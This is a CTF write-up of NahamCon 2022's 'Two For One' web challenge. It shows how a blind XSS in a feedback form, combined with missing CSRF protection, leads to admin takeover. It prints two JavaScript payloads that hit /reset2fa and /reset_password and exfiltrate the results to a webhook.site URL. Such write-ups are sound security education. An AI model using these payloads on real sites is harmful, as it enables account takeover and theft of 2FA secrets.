# NahamCon CTF 2022 - Two For One
category: Web - Hard

## solution

at the first page there is a login and signup page

![Screenshot_2022-05-01 Fort Knox](https://user-images.githubusercontent.com/83473054/166118848-40535718-4ce9-400b-ab17-88d772683333.png)

in the signup page we must get the google auth token cuz we need it for login and other stuffs.
after login we could see that we are able to create secrets

![Screenshot_2022-05-01 Fort Knox(1)](https://user-images.githubusercontent.com/83473054/166119065-46e8ce6b-30f7-4fda-8718-813b23de13ef.png)

but the goal is not creating notes, we have to somehow read admin notes
so we will go to settings

in settings we could see Feedback part which after some fuzzing we found it's vulnerable to blind xss

![Screenshot_2022-05-01 Fort Knox(2)](https://user-images.githubusercontent.com/83473054/166119184-474ff52a-dde4-4a06-a734-c0aa0c17b862.png)

but there are two more part in settings

## reset password
![Screenshot_2022-05-01 Fort Knox(3)](https://user-images.githubusercontent.com/83473054/166119229-3f7a0284-1bba-400d-8943-519264db6876.png)
and
## reset 2FA
![Screenshot_2022-05-01 Fort Knox(4)](https://user-images.githubusercontent.com/83473054/166119240-162ad12a-7247-4df5-88a2-a59fe2be559f.png)


we found there is no csrf for reset password and reset 2FA, but reset password need to confirming 2FA. so first of all we have to somehow hijack the google authentication token.

we could reset google auth with POST request to this endpoint ```/reset2fa```

I wrote below payload to hijack the result of  ```/reset2fa``` and send it to our webhook

```js
<script>
    xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://challenge.nahamcon.com:31170/reset2fa', false);
    xhr.send();
    document.location='https://webhook.site/x4xx4-xxx-xxx-xxxx-xxxx?otp='+xhr.response;
</script>
```
## result 
![Screenshot_2022-05-01 Webhook site - Test, process and transform emails and HTTP requests](https://user-images.githubusercontent.com/83473054/166119457-2e486284-6bf5-49c3-91c4-304fa9f91cf4.png)

now we have secret token. we should convert it to QR code
![Screenshot_2022-05-01_05_13_51](https://user-images.githubusercontent.com/83473054/166119519-e1885483-67f6-4023-9052-cad3cf9c0dc1.png)

got it and scaned with my phone, now I have the google auth

the next step is reseting admin password.

I wrote below payload to reset admin password

```js
<script>
    xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://challenge.nahamcon.com:31170/reset_password', false);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send(JSON.stringify({"otp":"068728","password":"a","password2":"a"}));
    document.location='https://webhook.site/3xxx4-xxxx-xxxxxx-xxxxx-xxxxx?res='+xhr.response;
</script>
```

and got ```{"success":true}``` in my webhook response.

now I can login with admin creds which it's username is ```admin``` and password is ```a``` (what we changed) and the google auth
logged in and we are able to read the flag from admin's secrets

![Screenshot_2022-05-01 Fort Knox(5)](https://user-images.githubusercontent.com/83473054/166119740-71f6c15a-9298-4b4a-bbad-bdb78ba0c352.png)


Really interesting challnege . thanks @congon4tor#2334

